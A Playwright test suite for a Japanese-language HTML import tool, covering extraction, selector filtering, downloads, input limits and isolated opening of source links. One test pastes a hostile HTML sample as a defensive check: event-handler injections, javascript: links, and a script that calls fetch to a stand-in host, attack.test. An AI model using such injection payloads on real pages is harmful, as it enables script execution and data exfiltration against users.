const {test,expect}=require('@playwright/test');
const cases=require('./fixtures/html-import/cases.json');
const input='<article class="markdown-body"><h1>見出し</h1><p>本文 <b>日本語</b></p><a href="/ref">参照</a></article>';
const source='https://example.test/dir/page';
// 🔌 Where the import is: the framed #html-import panel of the one screen (its CSP and page are its own, in the frame) in
// this source; the published run goes wherever the deployed front page's link points (a move is published after it merges).
let IMPORT='/tools/#html-import';
test.beforeAll(async({browser})=>{if(!process.env.HTML_TOOL_BASE_URL)return;const page=await browser.newPage();await page.goto(new URL('/',process.env.HTML_TOOL_BASE_URL).href);
 const url=new URL(await page.getByRole('link',{name:'Open HTML Import →'}).getAttribute('href')||IMPORT,page.url());IMPORT=url.pathname+url.hash;await page.close();});
async function open(page){await page.goto(IMPORT);const name=new URL(IMPORT,'http://site').hash.slice(1);let f=page.mainFrame();
 if(name){await page.waitForFunction(n=>document.querySelector(`#${n} iframe`)?.dataset.ready,name);f=await(await page.locator(`#${name} iframe`).elementHandle()).contentFrame();}
 await f.locator('#source-url').fill(source);return f;}
async function pasted(f, html=input){await f.locator('#html-input').fill(html);await f.locator('#paste-load').click();await expect(f.locator('#status')).toContainText('抽出しました');}
async function download(page,f){const pending=page.waitForEvent('download');await f.locator('#download').click();const d=await pending;const stream=await d.createReadStream();const chunks=[];for await(const c of stream)chunks.push(c);return JSON.parse(Buffer.concat(chunks).toString());}
for(const mobile of [false,true]){
 test.describe(mobile?'mobile':'desktop',()=>{
  test.use({viewport:mobile?{width:390,height:844}:{width:1440,height:900},isMobile:mobile,hasTouch:mobile});
  test('paste → extraction → conditions → download → clear',async({page},info)=>{
   const f=await open(page);expect(await f.locator("#profile").evaluate(el=>getComputedStyle(el).colorScheme)).toBe("dark");await pasted(f);await expect(f.locator('#body-result')).toHaveText('見出し 本文 日本語 参照');
   await expect(f.locator('#links-result')).toContainText('https://example.test/ref');
   const first=await download(page,f);expect(first.snapshot.schema).toBe('html-snapshot/1');expect(first.snapshot.fetched_at).toBeNull();expect(first.snapshot).not.toHaveProperty('html');
   await f.locator('#html-input').fill('<p>not loaded</p>');await f.locator('#source-url').fill('https://changed.test/');
   await f.locator('#selector').fill('article > p');await f.locator('#apply').click();await expect(f.locator('#body-result')).toHaveText('本文 日本語');
   const second=await download(page,f);expect(second.snapshot).toEqual(first.snapshot);expect(second.extraction.source_url).toBe(source);
   await f.locator('#selector').fill('[id]');await f.locator('#apply').click();await expect(f.locator('#status')).toContainText('unsupported selector syntax');await expect(f.locator('#download')).toBeDisabled();
   await f.locator('#selector').fill('');await f.locator('#profile').selectOption('github-readme');await f.locator('#apply').click();await expect(f.locator('#body-result')).toContainText('見出し');
   expect(await f.evaluate(()=>document.documentElement.scrollWidth<=innerWidth)).toBe(true);
   await f.locator('#html-input').fill(input);await f.locator('#source-url').fill(source);
   await page.screenshot({path:info.outputPath('result.png'),fullPage:true});
   await f.locator('#clear').click();await expect(f.locator('#body-result')).toBeEmpty();await expect(f.locator('#html-input')).toHaveValue('');await expect(f.locator('#download')).toBeDisabled();
  });
  test('file is read once and is never refetched for condition changes',async({page})=>{
   const f=await open(page);
   await f.evaluate(()=>{window.fileReads=0;const read=File.prototype.arrayBuffer;File.prototype.arrayBuffer=function(){window.fileReads++;return read.call(this);};});
   await f.locator('#file-input').setInputFiles({name:'sample.html',mimeType:'text/html',buffer:Buffer.from(input)});
   await expect(f.locator('#body-result')).toContainText('日本語');expect((await download(page,f)).input).toEqual({kind:'file',name:'sample.html'});
   await f.evaluate(()=>{File.prototype.arrayBuffer=()=>{throw Error('must not reread');};});
   await f.locator('#selector').fill('h1');await f.locator('#apply').click();await expect(f.locator('#body-result')).toHaveText('見出し');
   expect(await f.evaluate(()=>window.fileReads)).toBe(1);
  });
 });
}
test('shared Python/JS fixtures and explicit error contract',async({page})=>{
 const f=await open(page);
 for(const c of cases){
  const observed=await f.evaluate(async c=>{const {parseHTML,extract}=await import('/tools/html-import/extract.mjs');try{return {result:extract(parseHTML(c.html),c.url,c.profile,c.selector)};}catch(e){return {error:e.message};}},c);
  expect(observed,c.name).toEqual(c.error?{error:c.error}:{result:c.expected});
 }
});
test('input scripts, handlers, frames and resources remain inert; no input storage or communication',async({page})=>{
 const f=await open(page);await page.waitForLoadState('networkidle');
 const requests=[];page.on('request',r=>requests.push(r.url()));const dialogs=[];page.on('dialog',async d=>{dialogs.push(d.message());await d.dismiss();});
 await f.evaluate(()=>{window.inputExecuted=false;for(const key of ['localStorage','sessionStorage'])window[key].clear();});
 await pasted(f,`<article><h1>Safe</h1><p onclick="window.inputExecuted=true">Text</p><img src="https://attack.test/img" onerror="window.inputExecuted=true"><iframe src="https://attack.test/frame"></iframe><link rel="stylesheet" href="https://attack.test/style"><script>window.inputExecuted=true;fetch('https://attack.test/send');alert('bad')</script><style>@import 'https://attack.test/css';</style><template><p>hidden</p></template><noscript>hidden</noscript><a href="javascript:alert(1)">bad link</a></article>`);
 await f.locator('#selector').fill('p');await f.locator('#apply').click();await expect(f.locator('#body-result')).toHaveText('Text');
 expect(await f.evaluate(()=>window.inputExecuted)).toBe(false);expect(dialogs).toEqual([]);expect(requests).toEqual([]);
 expect(await f.evaluate(()=>[localStorage.length,sessionStorage.length])).toEqual([0,0]);expect(await f.locator('#body-result script,#body-result img,#body-result iframe').count()).toBe(0);
});
test('size, UTF-8, URL and depth failures clear stale downloads',async({page})=>{
 const f=await open(page);await pasted(f);
 await f.locator('#file-input').setInputFiles({name:'bad.html',mimeType:'text/html',buffer:Buffer.from([0xff,0xfe])});await expect(f.locator('#download')).toBeDisabled();
 await f.locator('#file-input').setInputFiles({name:'big.html',mimeType:'text/html',buffer:Buffer.alloc(2*1024*1024+1,65)});await expect(f.locator('#status')).toContainText('2 MiB');
 await f.locator('#source-url').fill('javascript:alert(1)');await f.locator('#paste-load').click();await expect(f.locator('#status')).toContainText('HTTP(S)');
 await f.locator('#source-url').fill(source);await f.locator('#html-input').fill('<div>'.repeat(129)+'text'+'</div>'.repeat(129));await f.locator('#paste-load').click();await expect(f.locator('#status')).toContainText('128');
});
test('portfolio still exposes old tools and the new independent tool',async({page})=>{
 await page.goto('/');const imp=page.getByRole('link',{name:'Open HTML Import →'});await expect(imp).toBeVisible();if(!process.env.HTML_TOOL_BASE_URL)await expect(imp).toHaveAttribute('href','./tools/#html-import');await expect(page.getByRole('link',{name:'Open Tool Lab →'})).toBeVisible();await expect(page.getByRole('link',{name:'Open Slide Studio →'})).toBeVisible();
});
for(const mobile of [false,true]){
 test.describe(mobile?'mobile source navigation':'desktop source navigation',()=>{
  test.use({viewport:mobile?{width:390,height:844}:{width:1440,height:900},isMobile:mobile,hasTouch:mobile});
  test('selected source opens only on click in an isolated new tab',async({page,context})=>{
   const f=await open(page);await pasted(f);await page.waitForLoadState('networkidle');
   const requests=[];let referer;
   context.on('request',r=>requests.push(r.url()));
   await context.route('https://source.example/chosen-source',async route=>{referer=route.request().headers().referer;await route.fulfill({contentType:'text/html',body:'<h1>Selected source</h1>'});});
   await f.locator('#source-url').fill('https://source.example/chosen-source');await expect(f.locator('#source-open')).toBeVisible();expect(requests).toEqual([]);
   const next=context.waitForEvent('page');await f.locator('#source-open').click();const popup=await next;await popup.waitForLoadState();expect(popup.url()).toBe('https://source.example/chosen-source');
   expect(await popup.evaluate(()=>window.opener)).toBeNull();expect(referer).toBeUndefined();await popup.close();
   await expect(f.locator('#body-result')).toHaveText('見出し 本文 日本語 参照');
   for(const invalid of ['javascript:alert(1)','ftp://example.test/','https://user:secret@example.test/','https://example.test\\bad']){
    await f.locator('#source-url').fill(invalid);await expect(f.locator('#source-open')).toBeHidden();await expect(f.locator('#source-open')).not.toHaveAttribute('href');
   }
  });
 });
}
